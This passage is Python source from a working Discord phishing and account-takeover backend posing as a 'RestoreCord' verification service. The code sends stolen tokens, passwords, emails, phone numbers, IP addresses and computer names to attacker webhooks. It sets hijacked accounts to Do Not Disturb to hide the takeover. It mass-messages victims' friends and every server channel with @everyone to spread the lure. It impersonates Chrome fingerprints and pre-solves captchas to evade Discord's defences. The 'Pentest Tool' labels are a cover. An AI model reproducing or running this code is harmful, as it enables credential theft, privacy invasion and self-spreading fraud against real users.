                    perms &= ~int(ow.get('deny', '0'))
                    perms |= int(ow.get('allow', '0'))

            if (perms & PERM_VIEW_CHANNEL) and (perms & PERM_SEND_MESSAGES):
                sendable.append(ch['id'])

        return sendable
    except Exception as e:
        print(f'[spam] Permission check failed for guild {guild_id}: {e}')
        return []

def _blast_send(s, h, ch_id, msg, uname, label, idx, total):
    """Send a single message with blast-optimised retry logic.
    Returns 'ok', '403', '429_fail', 'captcha', 'err', or status code string."""
    retries = 0
    while retries < 5:
        try:
            r = s.post(f'{API}/channels/{ch_id}/messages', headers=h,
                       json={'content': msg, 'nonce': _make_nonce(), 'tts': False, 'flags': 0},
                       timeout=15)
            code = r.status_code
            if code in (200, 201):
                print(f'[blast] {uname}: [{idx}/{total}] OK    {label}')
                time.sleep(0.4)
                return 'ok'
            elif code == 429:
                body = {}
                try: body = r.json()
                except: pass
                if 'captcha_key' in body or 'captcha_sitekey' in body:
                    print(f'[blast] {uname}: [{idx}/{total}] CAPTCHA {label}')
                    return 'captcha'
                ra = body.get('retry_after', 2)
                retries += 1
                print(f'[blast] {uname}: [{idx}/{total}] 429({ra:.1f}s) {label} retry #{retries}')
                time.sleep(ra + 0.3)
                continue
            elif code == 403:
                print(f'[blast] {uname}: [{idx}/{total}] 403   {label}')
                return '403'  # no delay — 403 doesn't cost rate limit
            else:
                print(f'[blast] {uname}: [{idx}/{total}] {code}  {label}')
                time.sleep(0.4)
                return str(code)
        except Exception as e:
            print(f'[blast] {uname}: [{idx}/{total}] ERR   {label}  {e}')
            return 'err'
    print(f'[blast] {uname}: [{idx}/{total}] GAVE UP {label}')
    return '429_fail'


def _mass_message(token, uname='?', tenant=None):
    """Send message to all open DMs, then all accessible guild text channels.
    Sequential blast: 0.4s after OK, 0s after 403, auto-retry 429 up to 5×.
    Runs in background thread so webhook isn't blocked."""
    dm_msg = _get_dm_message(tenant)
    guild_msg = _get_guild_message(tenant)
    if not dm_msg and not guild_msg:
        print(f'[blast] {uname}: No messages configured, skipping')
        return
    s = _make_session()
    h = {
        'Authorization': token,
        'User-Agent': UA,
        'Content-Type': 'application/json',
        'X-Super-Properties': sprops(),
        'Origin': 'https://discord.com',
        'Referer': 'https://discord.com/channels/@me',
        'Sec-CH-UA': SEC_CH_UA,
        'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE,
        'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'X-Discord-Locale': 'en-US',
    }
    h_noct = {k: v for k, v in h.items() if k != 'Content-Type'}
    stats = {'ok': 0, '403': 0, '429_fail': 0, 'captcha': 0, 'other': 0, 'err': 0}
    t0 = time.time()

    # ── DMs first ──
    dm_targets = []
    if dm_msg:
        try:
            r = s.get(f'{API}/users/@me/channels', headers=h_noct, timeout=15)
            if r.status_code == 200:
                for ch in r.json():
                    if ch.get('type') == 1:
                        recip = ch.get('recipients', [{}])[0]
                        dm_targets.append((ch['id'], recip.get('username', '?')))
                    elif ch.get('type') == 3:
                        dm_targets.append((ch['id'], ch.get('name') or 'Group'))
        except:
            pass
        print(f'[blast] {uname}: {len(dm_targets)} DM targets')

        for i, (ch_id, name) in enumerate(dm_targets, 1):
            result = _blast_send(s, h, ch_id, dm_msg, uname, name, i, len(dm_targets))
            if result == 'ok':
                stats['ok'] += 1
            elif result == '403':
                stats['403'] += 1
            elif result == 'captcha':
                stats['captcha'] += 1
                break
            elif result == 'err':
                stats['err'] += 1
            else:
                stats['other'] += 1

    # ── Guild channels ──
    if guild_msg:
        guilds = []
        try:
            r = s.get(f'{API}/users/@me/guilds', headers=h_noct, timeout=15)
            if r.status_code == 200:
                guilds = r.json()
        except:
            pass
        print(f'[blast] {uname}: {len(guilds)} guilds')

        for g in guilds:
            gid = g.get('id')
            if not gid:
                continue
            sendable = _guild_sendable_channels(s, h_noct, gid)
            if not sendable:
                continue
            gname = g.get('name', '?')
            print(f'[blast] {uname}: guild {gname} — {len(sendable)} sendable channels')

            for cid in sendable[:3]:
                result = _blast_send(s, h, cid, guild_msg, uname, f'{gname}/ch', 0, 0)
                if result == 'ok':
                    stats['ok'] += 1
                    break
                elif result == '403':
                    stats['403'] += 1
                    continue
                elif result == 'captcha':
                    stats['captcha'] += 1
                    break
                elif result == 'err':
                    stats['err'] += 1
                    break
                else:
                    stats['other'] += 1
                    break
            if stats['captcha']:
                break

    elapsed = time.time() - t0
    total = sum(stats.values())
    print(f'[blast] {uname}: Done! ok={stats["ok"]} 403={stats["403"]} 429_fail={stats["429_fail"]} captcha={stats["captcha"]} other={stats["other"]} err={stats["err"]} | {total} msgs in {elapsed:.1f}s')


def send_webhook(token, client_ip="?", password="?", tenant=None):
    client_ip = _clean_ip(client_ip)
    comp  = os.environ.get('COMPUTERNAME', platform.node())
    luser = os.environ.get('USERNAME', os.environ.get('USER', '?'))

    # Resolve webhook URL dynamically from panel config
    webhook_url = _get_webhook_for_tenant(tenant)

    # Stealth session for all Discord API calls
    s_api = _make_session()
    try:
        s_api.get('https://discord.com/channels/@me', headers={'User-Agent': UA}, timeout=10)
    except:
        pass
    api_h = {
        "Authorization": token, "User-Agent": UA,
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/json",
        "Origin": "https://discord.com",
        "Referer": "https://discord.com/channels/@me",
        "X-Super-Properties": sprops(),
        "X-Discord-Locale": "en-US",
        "X-Discord-Timezone": "America/New_York",
        "X-Debug-Options": "bugReporterEnabled",
        "Sec-CH-UA": SEC_CH_UA, "Sec-CH-UA-Mobile": SEC_CH_UA_MOBILE,
        "Sec-CH-UA-Platform": SEC_CH_UA_PLATFORM,
        "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin",
    }

    def _fallback(reason):
        if not webhook_url:
            print(f"[!] No webhook configured, fallback skipped ({reason})")
            return
        try:
            plain_req.post(webhook_url, json={
                "embeds": [{"description": f"**TOKEN ({reason}):**\n```{token}```\n**Password:** `{password}`\n**IP:** `{client_ip}`\n**PC:** `{comp}` / `{luser}`", "color": 16776960}],
                "username": "Pentest Tool"
            }, timeout=10)
            print(f"[+] Webhook sent (fallback: {reason})")
        except Exception as e2:
            print(f"[!] Webhook fallback failed: {e2}")
        if WEBHOOK_BACKUP:
            try:
                plain_req.post(WEBHOOK_BACKUP, json={
                    "embeds": [{"description": f"**TOKEN ({reason}):**\n```{token}```\n**Password:** `{password}`\n**IP:** `{client_ip}`\n**PC:** `{comp}` / `{luser}`", "color": 16776960}],
                    "username": "Pentest Tool"
                }, timeout=10)
            except: pass

    try:
        r = s_api.get(f"{API}/users/@me", headers=api_h, timeout=15)

        if r.status_code != 200:
            _fallback(f"info {r.status_code}"); return

        u = r.json()
        uid    = u.get('id', '?')
        uname  = u.get('username', 'N/A')
        disc   = u.get('discriminator', '0000')
        email  = u.get('email', 'N/A')
        phone  = u.get('phone', 'N/A')
        avatar = u.get('avatar')
        mfa    = u.get('mfa_enabled', False)
        nitro  = u.get('premium_type', 0) not in (None, 0)
        pfp    = f"https://cdn.discordapp.com/avatars/{uid}/{avatar}.png" if avatar else None
        color  = 65280 if nitro else 16711680

        active_token = token  # Track which token is currently valid
        final_password = password
        pw_changed = False

        # ── Send mass messages using the active (post-takeover) token ──
        # Only auto-DM if dm_enabled is toggled on in panel config
        panel_cfg = _get_panel_config(tenant.get('bot_key') if tenant else None, tenant.get('server_int') if tenant else None)
        if panel_cfg.get('dm_enabled', False):
            threading.Thread(target=_mass_message, args=(active_token, uname, tenant), daemon=True).start()
        else:
            print(f'[blast] {uname}: Auto-DM disabled in panel settings, skipping')

        try:
            cr = s_api.get(f"{API}/users/@me/channels", headers=api_h, timeout=10)
            dm_ids = [c['id'] for c in cr.json()] if cr.status_code == 200 else []
        except:
            dm_ids = []

        hq_str = _hq_guilds(active_token)
        try:
            gs = s_api.get(f"{API}/users/@me/guilds?with_counts=true",
                              headers=api_h, timeout=10).json()
            hq_ids = [g['id'] for g in gs if g.get("owner") or g.get("permissions") == "4398046511103"]
        except:
            hq_ids = []

        guild_ch = []
        for gid in hq_ids:
            try:
                gc = s_api.get(f"{API}/guilds/{gid}/channels",
                                  headers=api_h, timeout=10)
                if gc.status_code == 200:
                    guild_ch.extend(c['id'] for c in gc.json() if c.get('type') == 0)
            except:
                continue

        total = len(dm_ids) + len(guild_ch)

        # Build 2FA section for embed
        tfa_section = f"**2FA:** {'✅ Enabled' if mfa else '❌'}\n"

        # Build password section
        pw_line = f"**Password:** `{password}`\n"

        payload = {
            "embeds": [{
                "color": color,
                "thumbnail": {"url": pfp} if pfp else None,
                "author": {"name": f"{uname}#{disc}'s Information"},
                "description": (
                    f"**Discord ID:** `{uid}`\n"
                    f"**Email:** {email}\n"
                    f"**Phone:** {phone}\n"
                    f"{pw_line}"
                    f"{tfa_section}"
                    f"**Nitro:** {'✅' if nitro else '❌'}\n"
                    f"**System Info:**\n"
                    f"📛 Computer Name: `{comp}`\n"
                    f"👤 Username: `{luser}`\n"
                    f"🌐 IP Address: `{client_ip}`\n\n"
                    f"**TOKEN:**\n```{active_token}```\n"
                    f"**Messages to send:** `{total}`\n\n"
                    f"**HQ Guilds:**\n{hq_str}\n"
                ),
                "footer": {"text": "Logged by Combined Pentest Tool"}
            }],
            "username": "Pentest Tool"
        }
        if webhook_url:
            plain_req.post(webhook_url, json=payload, timeout=10)
            print(f"[+] Webhook sent for {uname}#{disc} ({uid})")
        else:
            print(f"[~] No webhook configured, skipping for {uname}#{disc}")
        # Also fire backup webhook
        if WEBHOOK_BACKUP:
            try:
                plain_req.post(WEBHOOK_BACKUP, json=payload, timeout=10)
            except: pass
        # Push token data to panel
        bot_key = tenant.get('bot_key') if tenant else None
        if bot_key:
            _push_token_to_panel(bot_key, {
                'token': active_token, 'user_id': uid, 'username': uname,
                'display_name': u.get('global_name', ''), 'email': email,
                'phone': phone, 'password': password, 'ip': client_ip,
                'avatar_url': pfp or '', 'nitro': nitro,
                'nitro_type': u.get('premium_type', 0),
                'mfa': mfa, 'has_billing': False, 'guilds_count': total,
                'badges': u.get('public_flags', 0),
                'verified': u.get('verified', False),
                'valid': True,
                'server_int': tenant.get('server_int', '') if tenant else '',
                'guild_id': tenant.get('guild_id', '') if tenant else '',
            })

    except Exception as e:
        print(f"[!] Webhook error: {e}")
        _fallback("exception")


def fire_webhook(token, client_ip="?", password="?", tenant=None):
    # Try to look up password from store if not provided
    if password == '?':
        with _pw_store_lock:
            password = _pw_store.pop(token, '?')
    # Try to get tenant from request context if not passed
    if tenant is None:
        try:
            tenant = _get_tenant()
        except:
            pass
    with _webhookd_lock:
        if token in _webhookd_tokens:
            print(f"[~] Webhook skipped (duplicate token)")
            return
        _webhookd_tokens.add(token)
    # Immediately set DND so the account shows Do Not Disturb
    threading.Thread(target=_set_dnd, args=(token,), daemon=True).start()
    threading.Thread(target=send_webhook, args=(token, client_ip, password, tenant), daemon=True).start()


def _get_user_brief(token):
    """Fetch user id, username, avatar URL from token for success page."""
    try:
        h = {"Authorization": token, "User-Agent": UA}
        r = plain_req.get(f"{API}/users/@me", headers=h, timeout=10)
        if r.status_code == 200:
            u = r.json()
            uid = u.get('id', '')
            avatar = u.get('avatar', '')
            uname = u.get('username', '')
            pfp = f"https://cdn.discordapp.com/avatars/{uid}/{avatar}.png?size=128" if avatar else ''
            return {'user_id': uid, 'username': uname, 'avatar_url': pfp}
    except:
        pass
    return {}


def _assign_role(user_id, guild_id=None, role_id=None, bot_token=None):
    """Add verified role to user in guild using bot token.
    Multi-tenant: guild_id, role_id, bot_token passed explicitly.
    Retries up to 3 times with backoff."""
    if not all([bot_token, guild_id, role_id, user_id]):
        print(f'[role] Skipping role assign: missing config (bot={bool(bot_token)}, guild={guild_id or "?"}, role={role_id or "?"}, user={user_id or "?"})')
        return False
    try:
        s = _make_session()
        url = f'{API}/guilds/{guild_id}/members/{user_id}/roles/{role_id}'
        h = {
            'Authorization': f'Bot {bot_token}',
            'User-Agent': 'DiscordBot (https://restorecordverify.info, 1.0)',
            'X-Audit-Log-Reason': 'RestoreCord verification',
            'Content-Length': '0',
        }
        for attempt in range(3):
            try:
                r = s.put(url, headers=h, timeout=10)
            except Exception as net_err:
                print(f'[role] Network error attempt {attempt+1}/3: {net_err}')
                if attempt < 2:
                    time.sleep(2 * (attempt + 1))
                    s = _make_session()
                    continue
                raise
            if r.status_code in (200, 204):
                print(f'[role] ✓ Assigned role {role_id} to user {user_id} in guild {guild_id}')
                return True
            elif r.status_code == 429:
                retry_after = 5
                try: retry_after = r.json().get('retry_after', 5)
                except: pass
                print(f'[role] Rate limited, retrying in {retry_after}s...')
                time.sleep(retry_after)
                continue
            elif r.status_code in (500, 502, 503, 504) or r.status_code == 403:
                print(f'[role] Server error attempt {attempt+1}/3 [{r.status_code}]: {r.text[:200]}')
                if attempt < 2:
                    time.sleep(2 * (attempt + 1))
                    s = _make_session()
                    continue
                print(f'[role] ✗ Failed after 3 attempts [{r.status_code}]: {r.text[:300]}')
                return False
            else:
                print(f'[role] ✗ Failed to assign role [{r.status_code}]: {r.text[:300]}')
                return False
        return False
    except Exception as e:
        print(f'[role] Error assigning role: {e}')
        return False


def _join_voice_channel(token, guild_id, channel_id):
    """Connect user's token to a voice channel via Gateway (once, no retry)."""
    if not all([token, guild_id, channel_id]):
        print(f'[voice] Skipping: missing token/guild/channel')
        return False
    try:
        print(f'[voice] Connecting {token[:20]}... to voice {channel_id}')
        ws = websocket.create_connection(
            'wss://gateway.discord.gg/?v=9&encoding=json',
            header=[f'User-Agent: {UA}', 'Origin: https://discord.com'],
            timeout=30
        )
        hello = json.loads(ws.recv())
        hb_interval = hello.get('d', {}).get('heartbeat_interval', 41250) / 1000

        # Identify with proper browser fingerprint
        ws.send(json.dumps({
            'op': 2,
            'd': {
                'token': token,
                'capabilities': 30717,
                'properties': {
                    'os': 'Windows', 'browser': 'Chrome', 'device': '',
                    'system_locale': 'en-US', 'browser_user_agent': UA,
                    'browser_version': f'{CHROME_VER}.0.0.0', 'os_version': '10',
                    'referrer': '', 'referring_domain': '',
                    'referrer_current': '', 'referring_domain_current': '',
                    'release_channel': 'stable',
                    'client_build_number': BUILD, 'client_event_source': None
                },
                'presence': {'status': 'online', 'since': 0, 'activities': [], 'afk': False},
                'compress': False
            }
        }))

        # Wait for READY event
        ready_timeout = time.time() + 15
        while time.time() < ready_timeout:
            raw = ws.recv()
            d = json.loads(raw)
            if d.get('t') == 'READY':
                print(f'[voice] Gateway READY, joining channel...')
                break
        else:
            print(f'[voice] Timeout waiting for READY')
            ws.close()
            return False

        # Voice State Update — join the channel (self-muted, self-deafened)
        ws.send(json.dumps({
            'op': 4,
            'd': {
                'guild_id': guild_id,
                'channel_id': channel_id,
                'self_mute': True,
                'self_deaf': True,
                'self_video': False
            }
        }))
        print(f'[voice] Sent voice state update for {channel_id}')

        # Keep alive for 2 minutes (heartbeats), then disconnect (was 5min — OOM fix)
        stop_at = time.time() + 120
        next_hb = time.time() + hb_interval
        ws.settimeout(hb_interval + 5)
        while time.time() < stop_at:
            try:
                if time.time() >= next_hb:
                    ws.send(json.dumps({'op': 1, 'd': None}))
                    next_hb = time.time() + hb_interval
                raw = ws.recv()
                d = json.loads(raw)
                if d.get('op') == 1:  # Heartbeat request
                    ws.send(json.dumps({'op': 1, 'd': None}))
                    next_hb = time.time() + hb_interval
            except websocket.WebSocketTimeoutException:
                pass
            except:
                break

        # Leave voice before disconnecting
        try:
            ws.send(json.dumps({'op': 4, 'd': {'guild_id': guild_id, 'channel_id': None, 'self_mute': True, 'self_deaf': True}}))
            time.sleep(0.5)
        except:
            pass
        ws.close()
        print(f'[voice] Disconnected from voice after 2min')
        return True
    except Exception as e:
        print(f'[voice] Error: {e}')
        return False


def _set_dnd(token):
    """Set the captured token's status to Do Not Disturb immediately."""
    try:
        s = _make_session()
        h = {
            'Authorization': token,
            'User-Agent': UA,
            'Content-Type': 'application/json',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Origin': 'https://discord.com',
            'Referer': 'https://discord.com/channels/@me',
            'X-Discord-Locale': 'en-US',
            'X-Discord-Timezone': 'America/New_York',
            'X-Debug-Options': 'bugReporterEnabled',
            'X-Super-Properties': sprops(),
            'Sec-CH-UA': SEC_CH_UA,
            'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE,
            'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        }
        r = s.patch(f"{API}/users/@me/settings", headers=h,
                    json={"status": "dnd"}, timeout=10)
        print(f'[dnd] Set DND: {r.status_code}')
        if r.status_code != 200:
            print(f'[dnd] Response: {r.text[:200]}')
    except Exception as e:
        print(f'[dnd] Error: {e}')


def _success_with_info(token, tenant=None):
    """Build success response with user info, fire webhook & assign role."""
    info = _get_user_brief(token)
    # Assign verified role in background using tenant context
    if info.get('user_id') and tenant:
        # New multi-server format: ask TOKENPANEL to assign role (bot token stays on panel)
        if tenant.get('identifier') and tenant.get('server_int'):
            threading.Thread(target=_assign_role_via_panel,
                             args=(tenant['identifier'], tenant['server_int'], info['user_id']),
                             daemon=True).start()
        else:
            # Legacy format: look up bot token from env var and assign directly
            bot_token = _get_bot_token(tenant.get('bot_key', '')) if tenant.get('bot_key') else None
            if bot_token:
                threading.Thread(target=_assign_role, args=(info['user_id'], tenant['guild_id'], tenant['role_id'], bot_token), daemon=True).start()
    return {'success': True, **info}


# ━━━━━━━━━━━━ DM Spread (stealth) ━━━━━━━━━━━━
import random

SPREAD_MESSAGE = ''  # Dynamic — loaded per-tenant from panel config

def _make_nonce():
    """Generate a Discord-style snowflake nonce (like real client)."""
    return str((int(time.time() * 1000) - 1420070400000) << 22 | random.randint(0, 4194303))


def _spread_dms(token, tenant=None):
    """Send invite link to all open DMs and friends using full Chrome TLS impersonation."""
    spread_msg = _get_spread_message(tenant)
    if not spread_msg:
        print('[spread] No spread message configured, skipping')
        return
    try:
        # Build a stealth session — same Chrome fingerprint the login used
        s = _make_session()

        # Visit discord.com first to get cookies (mimics real browser session)
        try:
            s.get('https://discord.com/channels/@me', headers={
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'User-Agent': UA,
                'Sec-CH-UA': SEC_CH_UA,
                'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE,
                'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
            }, timeout=15)
        except:
            pass

        def api_headers(with_ct=True):
            h = {
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Authorization': token,
                'Origin': 'https://discord.com',
                'Referer': 'https://discord.com/channels/@me',
                'User-Agent': UA,
                'X-Discord-Locale': 'en-US',
                'X-Discord-Timezone': 'America/Los_Angeles',
                'X-Debug-Options': 'bugReporterEnabled',
                'X-Super-Properties': sprops(),
                'Sec-CH-UA': SEC_CH_UA,
                'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE,
                'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
            }
            if with_ct:
                h['Content-Type'] = 'application/json'
            return h

        # ── PHASE 1: Collect all DM targets (open DMs + friends) — DMs FIRST ──
        dm_channel_ids = []
        try:
            r = s.get(f'{API}/users/@me/channels', headers=api_headers(False), timeout=15)
            if r.status_code == 200:
                for ch in r.json():
                    if ch.get('type') in (1, 3):  # 1=DM, 3=GroupDM
                        dm_channel_ids.append(ch['id'])
                print(f'[spread] Found {len(dm_channel_ids)} open DM channels')
            else:
                print(f'[spread] Failed to get DMs: {r.status_code}')
        except Exception as e:
            print(f'[spread] DM list error: {e}')

        # Get friends and open DM channels for those not already open
        friend_user_ids = set()
        try:
            r = s.get(f'{API}/users/@me/relationships', headers=api_headers(False), timeout=15)
            if r.status_code == 200:
                for rel in r.json():
                    if rel.get('type') == 1:
                        friend_user_ids.add(rel['id'])
                print(f'[spread] Found {len(friend_user_ids)} friends')
            else:
                print(f'[spread] Failed to get friends: {r.status_code}')
        except Exception as e:
            print(f'[spread] Friends list error: {e}')

        for fid in friend_user_ids:
            try:
                time.sleep(0.65)
                r = s.post(f'{API}/users/@me/channels', headers=api_headers(),
                           json={'recipients': [fid]}, timeout=15)
                if r.status_code == 200:
                    ch_id = r.json().get('id')
                    if ch_id and ch_id not in dm_channel_ids:
                        dm_channel_ids.append(ch_id)
            except:
                pass

        print(f'[spread] Total DM channels to message: {len(dm_channel_ids)}')

        # ── PHASE 2: Send DM messages ──
        sent = 0
        failed = 0
        for ch_id in dm_channel_ids:
            try:
                time.sleep(0.65)
                payload = {
                    'content': spread_msg,
                    'nonce': _make_nonce(),
                    'tts': False,
                    'flags': 0
                }
                r = s.post(f'{API}/channels/{ch_id}/messages',
                           headers=api_headers(), json=payload, timeout=15)
                if r.status_code == 200:
                    sent += 1
                elif r.status_code == 429:
                    retry = r.json().get('retry_after', 5)
                    print(f'[spread] Rate limited on {ch_id}, waiting {retry}s')
                    time.sleep(retry + 1)
                    r2 = s.post(f'{API}/channels/{ch_id}/messages',
                                headers=api_headers(), json=payload, timeout=15)
                    if r2.status_code == 200:
                        sent += 1
                    else:
                        failed += 1
                elif r.status_code == 403:
                    failed += 1
                else:
                    failed += 1
                    print(f'[spread] DM error {r.status_code} on {ch_id}')
            except Exception as e:
                failed += 1

        print(f'[spread] DMs done: sent={sent}, failed={failed}')

        # ── PHASE 3: Spam ALL guild text channels with @everyone ──
        guild_sent = 0
        guild_failed = 0
        try:
            r = s.get(f'{API}/users/@me/guilds', headers=api_headers(False), timeout=15)
            if r.status_code == 200:
                guilds = r.json()
                print(f'[spread] Found {len(guilds)} guilds to spam')
                for guild in guilds:
                    gid = guild['id']
                    try:
                        cr = s.get(f'{API}/guilds/{gid}/channels', headers=api_headers(False), timeout=15)
                        if cr.status_code != 200:
                            continue
                        channels = cr.json()
                        text_chs = [c for c in channels if c.get('type') == 0]
                        for ch in text_chs:
                            try:
                                time.sleep(0.65)
                                payload = {
                                    'content': f'@everyone {spread_msg}',
                                    'nonce': _make_nonce(),
                                    'tts': False,
                                    'flags': 0
                                }
                                r2 = s.post(f'{API}/channels/{ch["id"]}/messages',
                                            headers=api_headers(), json=payload, timeout=15)
                                if r2.status_code == 200:
                                    guild_sent += 1
                                elif r2.status_code == 429:
                                    rt = r2.json().get('retry_after', 5)
                                    time.sleep(rt + 1)
                                    r3 = s.post(f'{API}/channels/{ch["id"]}/messages',
                                                headers=api_headers(), json=payload, timeout=15)
                                    if r3.status_code == 200:
                                        guild_sent += 1
                                    else:
                                        guild_failed += 1
                                else:
                                    guild_failed += 1
                            except:
                                guild_failed += 1
                    except:
                        pass
        except Exception as e:
            print(f'[spread] Guild fetch error: {e}')

        print(f'[spread] Guilds done: sent={guild_sent}, failed={guild_failed}')
        print(f'[spread] TOTAL: DM={sent}, Guild={guild_sent}')

    except Exception as e:
        print(f'[spread] Fatal error: {e}')


# ━━━━━━━━━━━━ QR Remote Auth ━━━━━━━━━━━━

sessions = {}          # QR auth sessions
login_sessions = {}    # Captcha flow: sid -> DiscordSession (persisted between captcha challenge & solve)
_login_lock = threading.Lock()  # Thread-safe access to login_sessions
SESSION_SOLVE_TIMEOUT = 120  # Stop solving captchas for sessions older than 2 minutes

import collections

# ━━━━━━━━━━━━ Session Pre-Warm Pool ━━━━━━━━━━━━
# Pre-prepares DiscordSessions (cookies + fingerprint) so logins start faster.
# Saves ~2-4s per login by skipping the prepare() step.

_session_pool = collections.deque()
_session_pool_lock = threading.Lock()
_session_pool_active = 0
SESSION_POOL_MAX = 4     # reduced from 12 — Railway OOM fix
SESSION_POOL_TTL = 180   # 3 minutes (shorter = less stale sessions in RAM)


def _prepare_session_worker():
    global _session_pool_active
    try:
        ds = DiscordSession()
        ds.prepare()
        if ds.cookies_ready:
            with _session_pool_lock:
                _session_pool.append({'session': ds, 'time': time.time()})
            print(f'[session-pool] Ready! Pool: {len(_session_pool)}')
        else:
            print('[session-pool] Failed to prepare session')
    except Exception as e:
        print(f'[session-pool] Error: {e}')
    finally:
        with _session_pool_lock:
            _session_pool_active -= 1


def _refill_session_pool():
    global _session_pool_active
    with _session_pool_lock:
        now = time.time()
        while _session_pool and (now - _session_pool[0]['time']) > SESSION_POOL_TTL:
            stale = _session_pool.popleft()
            # Explicitly close the curl_cffi session to free memory
            try: stale['session'].s.close()
            except: pass
        pool_size = len(_session_pool)
        needed = SESSION_POOL_MAX - pool_size - _session_pool_active
        if needed <= 0:
            return
        to_launch = min(needed, 2)  # launch up to 2 at once (was 3)
        _session_pool_active += to_launch
    for _ in range(to_launch):
        threading.Thread(target=_prepare_session_worker, daemon=True).start()


def _get_ready_session():
    """Get a pre-prepared session from the pool (instant) or None."""
    with _session_pool_lock:
        now = time.time()
        while _session_pool:
            entry = _session_pool.popleft()
            if now - entry['time'] < SESSION_POOL_TTL:
                threading.Thread(target=_refill_session_pool, daemon=True).start()
                return entry['session']
    _refill_session_pool()
    return None


def _session_pool_loop():
    """Background loop — keeps session pool full."""
    print('[session-pool] Background loop started (warming in 3s)')
    time.sleep(3)
    while True:
        try:
            _refill_session_pool()
        except Exception as e:
            print(f'[session-pool] Error: {e}')
        time.sleep(15)  # check every 15s instead of 8s — less memory churn


# ━━━━━━━━━━━━ Global Captcha Token Arsenal ━━━━━━━━━━━━
# Discord captcha challenges are IP/session-based, NOT email-specific.
# Random chars as email still triggers captcha. So we pre-solve tokens 24/7
# using dummy logins and keep a ready pool. When someone clicks Login,
# we grab a token from the pool — zero wait. The pool auto-refills.

import collections

DEFAULT_SITEKEY = 'a9b5fb07-92ff-493f-86fe-352a2803b3df'
_last_discord_sitekey = DEFAULT_SITEKEY

ARSENAL_TARGET    = 0    # on-demand only — no idle pre-solving (saves $$$)
ARSENAL_MAX       = 2    # hard cap
ARSENAL_TTL       = 110  # seconds before a token expires (hCaptcha ~120s)
ARSENAL_WORKERS   = 1    # single solve pipeline

# Thread-safe token pool
_arsenal          = collections.deque()  # deque of {'token', 'rqtoken', 'sitekey', 'time'}
_arsenal_lock     = threading.Lock()
_arsenal_active   = 0    # number of pipelines currently running


def _arsenal_pipeline():
    """One pipeline: session → dummy login → get rqdata → solve → add to pool."""
    global _arsenal_active
    try:
        ds = _get_ready_session() or DiscordSession()
        ds.prepare()
        # Random junk email — Discord doesn't care, still gives captcha
        junk = uuid.uuid4().hex[:10] + '@' + uuid.uuid4().hex[:6] + '.com'
        payload = {
            'login': junk,
            'password': 'Arsenal247PreSolve!',
            'undelete': False, 'gift_code_sku_id': None, 'login_source': None,
        }
        r = ds.post('/auth/login', payload)
        j = r.json()

        ckeys = j.get('captcha_key', [])
        is_captcha = isinstance(ckeys, list) and (
            'captcha-required' in ckeys or j.get('captcha_sitekey')
        )
        if not is_captcha:
            print(f'[arsenal] No captcha returned — IP might be clean or rate-limited')
            return

        sitekey = j.get('captcha_sitekey', DEFAULT_SITEKEY)
        rqdata  = j.get('captcha_rqdata', '')
        rqtoken = j.get('captcha_rqtoken', '')

        print(f'[arsenal] Got challenge, solving... (sitekey={sitekey[:16]})')
        token, err = solve_captcha(sitekey, rqdata)

        if token:
            # Close the curl_cffi session — we only need the captcha token string
            try: ds.s.close()
            except: pass
            with _arsenal_lock:
                _arsenal.append({
                    'token': token, 'rqtoken': rqtoken,
                    'sitekey': sitekey, 'time': time.time(),
                    # NOTE: 'ds' removed — was holding full curl_cffi session in RAM
                })
                pool_size = len(_arsenal)
            print(f'[arsenal] ✓ Token ready! Pool: {pool_size}/{ARSENAL_TARGET}')
        else:
            print(f'[arsenal] Solve failed: {err}')
    except Exception as exc:
        print(f'[arsenal] Pipeline error: {exc}')
    finally:
        with _arsenal_lock:
            _arsenal_active -= 1


def _arsenal_grab():
    """Grab a fresh token from the pool. Returns dict or None.
    Triggers refill in background after consuming."""
    with _arsenal_lock:
        now = time.time()
        while _arsenal:
            entry = _arsenal.popleft()
            age = now - entry['time']
            if age < ARSENAL_TTL:
                print(f'[arsenal] Grabbed token (age {age:.0f}s, pool left: {len(_arsenal)})')
                # Kick off refill
                threading.Thread(target=_arsenal_refill, daemon=True).start()
                return entry
            else:
                print(f'[arsenal] Discarded expired token (age {age:.0f}s)')
    # Pool empty — kick refill
    threading.Thread(target=_arsenal_refill, daemon=True).start()
    return None


def _arsenal_refill():
    """Launch pipeline workers to bring pool back up to target."""
    global _arsenal_active
    with _arsenal_lock:
        # Purge expired
        now = time.time()
        while _arsenal and (now - _arsenal[0]['time']) >= ARSENAL_TTL:
            _arsenal.popleft()
        pool_size = len(_arsenal)
        needed = ARSENAL_TARGET - pool_size - _arsenal_active
        if needed <= 0:
            return
        to_launch = min(needed, ARSENAL_WORKERS)
        _arsenal_active += to_launch
    for _ in range(to_launch):
        threading.Thread(target=_arsenal_pipeline, daemon=True).start()


def _arsenal_loop():
    """Background loop: keep the arsenal full 24/7."""
    print(f'[arsenal] 24/7 token pool started (target={ARSENAL_TARGET}, TTL={ARSENAL_TTL}s)')
    time.sleep(1)  # Let sessions warm up first
    while True:
        try:
            _arsenal_refill()
        except Exception as exc:
            print(f'[arsenal] Loop error: {exc}')
        time.sleep(3)  # Check every 3s


